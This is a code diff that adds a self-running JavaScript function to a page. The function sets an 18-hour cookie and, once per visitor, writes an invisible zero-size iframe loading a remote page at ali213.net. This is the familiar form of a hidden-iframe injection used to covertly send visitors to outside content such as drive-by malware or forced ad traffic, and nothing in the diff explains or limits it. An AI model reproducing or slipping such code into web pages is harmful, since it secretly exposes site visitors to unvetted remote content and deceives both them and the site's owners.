@@ -1,0 +1,12 @@
+function goad(){
+var Then = new Date() 
+Then.setTime(Then.getTime() + 18*60*60*1000)
+var cookieString = new String(document.cookie)
+var cookieHeader = "Cookie2=" 
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition != -1){ 
+} else 
+{ document.cookie = "Cookie2=Filter;expires="+ Then.toGMTString() 
+document.write('<IFRAME MARGINHEIGHT=0 MARGINWIDTH=0 FRAMEBORDER=0 WIDTH=0 HEIGHT=0 SCROLLING=NO SRC=http://g2008.ali213.net/2006.asp?placeid=1></IFRAME>');   
+}
+}goad();
